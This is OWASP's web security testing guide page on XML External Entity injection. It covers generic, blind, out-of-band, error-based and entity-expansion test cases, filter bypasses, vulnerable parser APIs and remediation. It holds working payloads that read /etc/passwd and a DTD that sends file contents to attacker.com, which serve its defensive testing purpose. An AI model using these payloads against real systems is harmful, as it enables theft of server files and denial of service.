# Testing for XML External Entity Injection

|ID          |
|------------|
|WSTG-INPV-20|

## Summary

XML External Entity Injection occurs when an attacker injects XML input containing a reference to an external entity to an application built on a weakly configured XML parser. If the XML parser processes the tainted input to dereference external entities injected by attacker, then the test will yield a positive result.

XML external entities are storage units whose defined values are referenced by an URI declared via a system identifier. XML processor dereferences the system identifier to replace occurrences of the named external entity with the contents of the resource.

This vulnerability can be used to conduct a number of attacks including:

- Disclosing local files, which may contain sensitive user data or passwords.
- Port scanning of internal hosts ("internal" in relation to the users of the web application).
- Abusing the trusted application to pivot to other internal systems, to disclose internal content via HTTP requests.
- Remote code execution by abusing XML processor vulnerabilities such as memory corruption or via plugins such as `expect` in PHP.
- Exfiltrating sensitive information via an attacker-controlled DNS server.
- Denial of service attack via recursive entity expansion (also referred to as 'The Billion Laughs Attack').

## Test Objectives

- Identify XML injection points.
- Test if DTD definitions are accepted from user input and processed by the application.
- Test if external or internal entities are accepted from user input and expanded by the XML processor.

## How to Test

Let's suppose there is a web application using an XML style communication in order to perform user registration. When a user registers himself by filling an HTML form, the application receives the user's data in a standard `POST` request, for the sake of simplicity, let's consider only the POST request body.

```xml
<?xml version="1.0"?>
<user>
    <username>John</username>
    <password>Sec$r3P@ss</password>
    <email>john@example.com</email>
</user>
```

Alternatively, certain applications use JSON style communication which could be parsed and converted before processing in a back-end XML processor. In such cases, testers should convert JSON data to XML data using an intercepting proxy tool, to confirm if the application uses an XML processor on the back-end.

### Generic Test Cases

To test an application for the presence of XXE Injection vulnerability, XML entity declaration can be inserted in the request, to test if the introduced entity is expanded by the XML processor.

For example, tester can introduce a new XML entity in the user registration request.

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY entitytest "John"> ]>
<user>
    <username>&entitytest;</username>
    <password>Sec$r3P@ss</password>
    <email>s4tan@hell.com</email>
</user>
```

An XML processor vulnerable to XXE may expand above request to replace instances of `entitytest` entity with the string `John`.

#### Read local files

To test if local files can be read, introduce (or edit) DOCTYPE element to define an entity that references a local file.

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<user>
    <username>John</username>
    <password>Sec$r3P@ss</password>
    <email>s4tan@hell.com</email>
    <address>&xxe;</address>
</user>
```

When the payload is dereferenced by the XML processor, entity `&xxe` is expanded to replace with the contents of local file `/etc/passwd`. This causes application to include the contents of the file in the response. For applications running on Windows based servers, this test can be performed by introducing an entity referencing `C:\windows\system32\drivers\etc\hosts`.

#### Blind XXE

In many cases, XML processor may expand the tainted XML input but the output is not included in the application response. Direct retrieval of server-side files are not feasible in such situations. To test such applications, an external entity can be defined to reference a tester controlled URL, which will receive an out-of-band network interaction on successful entity expansion.

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe-test"> ]>
<shoppingcart>
    <pid>123</pid>
    <productname>Cotton Candy</productname>
    <comments>&xxe;</comments>
</shoppingcart>
```

##### Exfiltrating data via Blind XXE

Out-of-band techniques can be leveraged to exfiltrate files in situations where the XML processor is processing injected XML payload but an output is not displayed in the server response.

An external DTD can be hosted in a tester controlled URL location which is reachable by the application.

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % expand "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%file;'>">
%expand;
%exfil;
```

External DTD can be referenced in the request as:

```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/external.dtd"> %xxe;]>
```

#### Error-based XXE

In certain cases application may expose verbose error messages within the HTTP response, should a malformed XML input be provided. To test error-based xxe, external DTD can be introduced to trigger XML parsing error, so as to display the contents of a local file inside an error message.

An external DTD can be crafted to intentionally trigger an error and the DTD should be hosted in a URL location reachable by the target application. For example:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % expand "<!ENTITY &#x25; error SYSTEM 'file:///doesnotexist/%file;'>">
%expand;
%error;
```

External DTD can be referenced in the request as:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/external.dtd"> %xxe;]>
<shoppingcart>
    <pid>123</pid>
    <productname>Cotton Candy</productname>
    <comments>Lots of Candy</comments>
</shoppingcart>
```

#### XML Entity Expansion

If the target allows internal entities to be used whereas external entities are blocked; tests can be performed to check if the application performs recursive entity expansion. Recursive entity expansion, if performed to a sufficient depth can result in a denial of service condition. Tests should be done up to a moderate depth of expansion to prevent actual denial of service and to observe time delays in application response.

```xml
<!DOCTYPE data [
<!ENTITY a0 "lol" >
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
]>
<data>&a4;</data>
```

#### Filter Bypass

Web application filters can be configured to detect common XXE attack payloads in HTTP requests and reject such requests. Weak or poorly configured filters can be evaded using techniques outlined below:

- Some XML implementations support the `PUBLIC` keyword which is similar to `SYSTEM` and can be used to create external entities.
- UTF-8 and UTF-16 encodings can be used to encode the XXE payloads to get around web filters.
- For PHP applications, PHP filters such as `convert.base64-encode` can be used to evade filters, especially if the filter logic is to identify and filter URIs starting with `file:///`.

### Source Code Review

The following Java APIs may be vulnerable to XXE if they are not configured properly.

```text
javax.xml.parsers.DocumentBuilder
javax.xml.parsers.DocumentBuildFactory
org.xml.sax.EntityResolver
org.dom4j.*
javax.xml.parsers.SAXParser
javax.xml.parsers.SAXParserFactory
TransformerFactory
SAXReader
DocumentHelper
SAXBuilder
SAXParserFactory
XMLReaderFactory
XMLInputFactory
SchemaFactory
DocumentBuilderFactoryImpl
SAXTransformerFactory
DocumentBuilderFactoryImpl
XMLReader
Xerces: DOMParser, DOMParserImpl, SAXParser, XMLParser
```

Check source code if the docType, external DTD, and external parameter entities are set as forbidden uses.

- [XML External Entity (XXE) Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)

In addition, the Java POI office reader may be vulnerable to XXE if the version is under 3.10.1.

The version of POI library can be identified from the filename of the JAR. For example,

- `poi-3.8.jar`
- `poi-ooxml-3.8.jar`

The followings source code keyword may apply to C.

- libxml2: xmlCtxtReadMemory,xmlCtxtUseOptions,xmlParseInNodeContext,xmlReadDoc,xmlReadFd,xmlReadFile ,xmlReadIO,xmlReadMemory, xmlCtxtReadDoc ,xmlCtxtReadFd,xmlCtxtReadFile,xmlCtxtReadIO
- libxerces-c: XercesDOMParser, SAXParser, SAX2XMLReader

## Remediation

Ideal mitigation for XXE injection is to disable DTDs completely, to prevent users from injecting entities. If it is not possible to disable DTDs completely, disabling external entities and document type declarations can be the alternative solution.

## Tools

- [XML Injection Fuzz Strings (from wfuzz tool)](https://github.com/xmendez/wfuzz/blob/master/wordlist/Injections/XML.txt)
- [XXE Fuzz Strings (from Seclists repository)](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/XXE-Fuzzing.txt)

## References

- [OWASP XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
- [XML external entity - PortSwigger Academy"](https://portswigger.net/web-security/xxe)
- [Timothy Morgan’s 2014 Paper: XML Schema, DTD, and Entity Attacks - A Compendium of Known Techniques](http://www.vsecurity.com/download/papers/XMLDTDEntityAttacks.pdf)
- [Gregory Steuck, "XXE (Xml eXternal Entity) attack"](https://www.securityfocus.com/archive/1/297714)
